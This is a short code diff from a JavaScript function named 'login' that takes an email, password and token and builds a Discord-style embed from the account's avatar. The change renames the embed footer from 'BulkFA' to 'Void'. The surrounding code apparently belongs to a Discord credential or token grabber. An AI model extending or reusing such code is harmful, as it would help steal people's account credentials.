@@ -650,7 +650,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Void',
         },
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/981957512016318524/984087621678534676/a650d11c296f2f76196c67dc5faabc84.png',
